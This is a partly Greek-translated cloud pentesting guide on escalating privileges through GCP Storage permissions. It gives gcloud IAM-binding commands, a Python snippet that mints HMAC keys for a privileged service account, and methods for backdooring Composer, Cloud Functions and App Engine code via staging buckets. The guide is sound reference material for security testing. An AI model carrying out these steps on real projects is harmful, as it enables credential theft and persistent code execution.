# GCP - Storage Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Storage

Βασικές πληροφορίες:

{{#ref}}
../gcp-services/gcp-storage-enum.md
{{#endref}}

### `storage.objects.get`

This permission allows you to **download files stored inside Cloud Storage**. This will potentially allow you to escalate privileges because in some occasions **sensitive information is saved there**. Moreover, some GCP services stores their information in buckets:

- **GCP Composer**: When you create a Composer Environment the **code of all the DAGs** will be saved inside a **bucket**. These tasks might contain interesting information inside of their code.
- **GCR (Container Registry)**: The **image** of the containers are stored inside **buckets**, which means that if you can read the buckets you will be able to download the images and **αναζητήσετε leaks και/ή source code**.

### `storage.objects.setIamPolicy`

Σας επιτρέπει να **εκμεταλλευτείτε οποιοδήποτε από τα προηγούμενα σενάρια αυτής της ενότητας**.
```bash
# Add binding
gcloud storage objects add-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Remove binding
gcloud storage objects remove-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Change Policy
gcloud storage objects set-iam-policy gs://<BUCKET_NAME>/<OBJECT_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
### **`storage.buckets.setIamPolicy`**

Για παράδειγμα, για το πώς να τροποποιήσετε δικαιώματα με αυτήν την άδεια, δείτε αυτή τη σελίδα:
```bash
# Add binding
gcloud storage buckets add-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Remove binding
gcloud storage buckets remove-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Change policy
gcloud storage buckets set-iam-policy gs://<BUCKET_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
{{#ref}}
../gcp-unauthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md
{{#endref}}

### `storage.hmacKeys.create`

Η δυνατότητα "interoperability" του Cloud Storage, σχεδιασμένη για **διαλειτουργίες μεταξύ cloud** όπως με AWS S3, περιλαμβάνει την **δημιουργία HMAC keys για Service Accounts και χρήστες**. Ένας επιτιθέμενος μπορεί να το εκμεταλλευτεί **δημιουργώντας ένα HMAC key για ένα Service Account με αυξημένα προνόμια**, αυξάνοντας έτσι τα **προνόμια μέσα στο Cloud Storage**. Ενώ τα HMAC keys που σχετίζονται με χρήστες ανακτώνται μόνο μέσω του web console, τόσο τα access και secret keys παραμένουν **διαρκώς προσβάσιμα**, επιτρέποντας ενδεχόμενη αποθήκευση για backup πρόσβαση. Αντιθέτως, τα HMAC keys συνδεδεμένα με Service Accounts είναι προσβάσιμα μέσω API, αλλά τα access και secret keys τους δεν μπορούν να ανακτηθούν μετά τη δημιουργία, προσθέτοντας ένα επίπεδο πολυπλοκότητας για συνεχή πρόσβαση.
```bash
# Create key
gsutil hmac create <sa-email> # You might need to execute this inside a VM instance

## If you have TROUBLES creating the HMAC key this was you can also do it contacting the API directly:
PROJECT_ID = '$PROJECT_ID'
TARGET_SERVICE_ACCOUNT = f"exam-storage-sa-read-flag-3@{PROJECT_ID}.iam.gserviceaccount.com"
ACCESS_TOKEN = "$CLOUDSDK_AUTH_ACCESS_TOKEN"
import requests
import json
key = requests.post(
f'https://www.googleapis.com/storage/v1/projects/{PROJECT_ID}/hmacKeys',
params={'access_token': ACCESS_TOKEN, 'serviceAccountEmail': TARGET_SERVICE_ACCOUNT}
).json()
#print(json.dumps(key, indent=4))
print(f'ID: {key["metadata"]["accessId"]}')
print(f'Secret: {key["secret"]}')


# Configure gsutil to use the HMAC key
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```
Ένα ακόμη exploit script για αυτή τη μέθοδο μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py).

### `storage.objects.create`, `storage.objects.delete` = Δικαιώματα εγγραφής στο Storage

Για να **δημιουργήσετε ένα νέο αντικείμενο** μέσα σε ένα bucket χρειάζεστε `storage.objects.create` και, σύμφωνα με [the docs](https://cloud.google.com/storage/docs/access-control/iam-permissions#object_permissions), χρειάζεστε επίσης `storage.objects.delete` για να **τροποποιήσετε** ένα υπάρχον αντικείμενο.

Μια πολύ **συνηθισμένη εκμετάλλευση** buckets όπου μπορείτε να γράψετε στο cloud είναι όταν το **bucket αποθηκεύει αρχεία web server** — μπορεί να καταφέρετε να **αποθηκεύσετε νέο κώδικα** που θα χρησιμοποιηθεί από την web εφαρμογή.

### Composer

**Composer** είναι **Apache Airflow** διαχειριζόμενο μέσα στο GCP. Έχει αρκετά ενδιαφέροντα χαρακτηριστικά:

- Τρέχει μέσα σε ένα **GKE cluster**, οπότε το **SA που χρησιμοποιεί το cluster είναι προσβάσιμο** από τον κώδικα που τρέχει μέσα στο Composer
- Όλα τα components ενός composer environment (**κώδικας των DAGs**, plugins και data) αποθηκεύονται μέσα σε ένα GCP bucket. Εάν ο attacker έχει δικαιώματα ανάγνωσης και εγγραφής σε αυτό, μπορεί να παρακολουθεί το bucket και **όποτε δημιουργείται ή ενημερώνεται ένα DAG, να υποβάλει μια backdoored έκδοση** ώστε το composer environment να πάρει από το storage την παραβιασμένη έκδοση.

**Μπορείτε να βρείτε ένα PoC αυτής της επίθεσης στο repo:** [**https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs**](https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs)

### Cloud Functions

- Ο κώδικας των Cloud Functions αποθηκεύεται στο Storage και κάθε φορά που δημιουργείται νέα έκδοση ο κώδικας προωθείται στο bucket και μετά το νέο container χτίζεται από αυτόν τον κώδικα. Επομένως, **εάν αντικαταστήσετε τον κώδικα πριν δημιουργηθεί η νέα έκδοση, είναι δυνατή η εκτέλεση αυθαίρετου κώδικα από τη cloud function**.

**Μπορείτε να βρείτε ένα PoC αυτής της επίθεσης στο repo:** [**https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions**](https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions)

### App Engine

Οι εκδόσεις του AppEngine δημιουργούν κάποια δεδομένα μέσα σε ένα bucket με το όνομα σε μορφή: `staging.<project-id>.appspot.com`. Μέσα σε αυτό το bucket, είναι δυνατό να βρεθεί ένας φάκελος `ae` που θα περιέχει έναν φάκελο ανά έκδοση της AppEngine εφαρμογής και μέσα σε αυτούς τους φακέλους θα βρεθεί το αρχείο `manifest.json`. Αυτό το αρχείο περιέχει ένα json με όλα τα αρχεία που πρέπει να χρησιμοποιηθούν για να δημιουργηθεί η συγκεκριμένη έκδοση. Επιπλέον, είναι δυνατό να βρεθούν τα **πραγματικά ονόματα των αρχείων, το URL τους μέσα στο GCP bucket (τα αρχεία μέσα στο bucket έχουν αλλάξει όνομα στο sha1 hash τους) και το sha1 hash κάθε αρχείου.**

_Σημείωση ότι δεν είναι δυνατόν να γίνει pre-takeover αυτού του bucket επειδή οι GCP users δεν έχουν εξουσιοδότηση να δημιουργούν buckets χρησιμοποιώντας το domain appspot.com._

Ωστόσο, με πρόσβαση ανάγνωσης & εγγραφής σε αυτό το bucket, είναι δυνατό να escalate privileges στο SA που συνδέεται με την έκδοση του App Engine παρακολουθώντας το bucket και κάθε φορά που γίνεται αλλαγή (νέα έκδοση), να τροποποιήσετε τη νέα έκδοση όσο πιο γρήγορα γίνεται. Με αυτόν τον τρόπο, το container που θα δημιουργηθεί από αυτόν τον κώδικα θα εκτελέσει τον backdoored κώδικα.

Η προαναφερθείσα επίθεση μπορεί να πραγματοποιηθεί με πολλούς διαφορετικούς τρόπους, όλοι ξεκινούν παρακολουθώντας το `staging.<project-id>.appspot.com` bucket:

- Ανεβάστε τον πλήρη νέο κώδικα της έκδοσης AppEngine σε ένα διαφορετικό και διαθέσιμο bucket και προετοιμάστε ένα **`manifest.json` αρχείο με το νέο όνομα bucket και τα sha1 hashes τους**. Στη συνέχεια, όταν δημιουργηθεί νέα έκδοση μέσα στο bucket, απλά χρειάζεται να τροποποιήσετε το `manifest.json` και να ανεβάσετε το κακόβουλο `manifest.json`.
- Ανεβάστε μια τροποποιημένη έκδοση του `requirements.txt` που θα χρησιμοποιεί τον **κακόβουλο κώδικα των dependencies** και ενημερώστε το `manifest.json` με το νέο όνομα αρχείου, το URL και το hash του.
- Ανεβάστε ένα **τροποποιημένο `main.py` ή `app.yaml` αρχείο που θα εκτελεί τον κακόβουλο κώδικα** και ενημερώστε το `manifest.json` με το νέο όνομα αρχείου, URL και hash.

**Μπορείτε να βρείτε ένα PoC αυτής της επίθεσης στο repo:** [**https://github.com/carlospolop/Monitor-Backdoor-AppEngine**](https://github.com/carlospolop/Monitor-Backdoor-AppEngine)

### GCR

- **Google Container Registry** αποθηκεύει τις εικόνες μέσα σε buckets — αν μπορείτε να **γράψετε σε αυτά τα buckets**, ίσως να μπορείτε να move laterally προς τις υπηρεσίες όπου αυτές οι εικόνες εκτελούνται.
- Το bucket που χρησιμοποιείται από GCR θα έχει URL παρόμοιο με `gs://<eu/usa/asia/nothing>.artifacts.<project>.appspot.com` (Τα top level subdomains περιγράφονται [εδώ](https://cloud.google.com/container-registry/docs/pushing-and-pulling)).

> [!TIP]
> Αυτή η υπηρεσία είναι deprecated οπότε αυτή η επίθεση δεν είναι πλέον χρήσιμη. Επιπλέον, Artifact Registry, η υπηρεσία που την αντικαθιστά, δεν αποθηκεύει τις εικόνες σε buckets.

## **Αναφορές**

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/#:\~:text=apiKeys.-,create,privileges%20than%20our%20own%20user.](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
